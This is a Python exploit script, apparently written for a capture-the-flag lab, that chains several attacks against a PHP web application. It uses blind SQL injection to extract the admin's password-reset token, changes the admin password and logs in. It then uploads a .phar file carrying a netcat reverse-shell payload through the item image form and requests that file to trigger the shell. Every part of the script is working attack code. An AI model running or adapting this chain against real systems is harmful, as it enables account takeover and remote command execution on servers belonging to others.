import requests,string,time,re,sys,codecs

r = requests.Session()
base_path = "http://secure"
login_path = "/login/checkLogin.php"
viewItem_path = "/item/viewItem.php"
resetPassword_path = "/login/resetPassword.php"
doChangePassword_path = "/login/doChangePassword.php"
updateItem_path = "/item/updateItem.php"
revshell_upload_path = "/item/image/shell.phar"

def generate_token(username):
    data = {"username" : username}
    response = r.post(base_path+resetPassword_path, data=data)
    print("Password Reset Request Sent" if "Success" in response.text else "Reset Request Failed")

def char_extract(payload):
    params = {"id" : payload}
    response = r.get(base_path+viewItem_path, params=params, allow_redirects=False)
    return response.status_code
 
def token_extract():
    charset = string.printable
    token = ""
    for i in range(20):
        for char in charset:
            payload = "1  and binary char(%s) = (select substring(token,%s,1) from user where id=1)" % (ord(str(char)),str(i+1))
            if char_extract(payload) == 404:
                token += char
                break
        #print(token, end='', flush=True) #not working as expected
    return token
            
def change_password(token, password):
    data = {"token": token, "password": password}
    response = r.post(base_path+doChangePassword_path, data=data)
    if "Password Changed" in response.text:
        print("[*] Password changed to %s" % password)
        return True
    return False

def login_user(username, password):
    success = False
    data = {"username": username, "password": password}
    response = r.post(base_path+login_path, data=data)
    if "Success" in response.text:
        print("[*] LoggedIn Successfully")
        success = True
        match = re.findall(r"FLAG1: (\w*)?", response.text)
        if(match):
            print(f"Flag1: {match[0]}")
    return success

def upload_malicious_file():
    data = {"id": "1", "id_user": "1", "name": "Testing Item", "description": "Description of the test item", "price": "100" }
    payload_str = '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f");?>' % (listen_host, listen_port)
    payload_bytes = codecs.encode(payload_str, 'utf-8')
    files = {"image": ("shell.phar", payload_bytes)}
    response = r.post(base_path+updateItem_path, files=files, data=data)

def execute_revshell():
    response = r.get(base_path+revshell_upload_path)
    assert response.status_code != 404, "Reverse Shell not found"

if __name__ == "__main__":
    username = "admin"
    password = "admin"
    listen_host = sys.argv[1]
    listen_port = sys.argv[2]
    print("[*] Sending Token Generation Request for User %s" % username)
    generate_token(username)
    token = token_extract()
    print("[*] Password Reset Token: %s" % token)
    change_password(token, password)
    login_user(username, password)
    upload_malicious_file()
    print("[*] Malicious .phar File Uploaded")
    time.sleep(0.5)
    print("[*] Executing Reverse Shell")
    execute_revshell()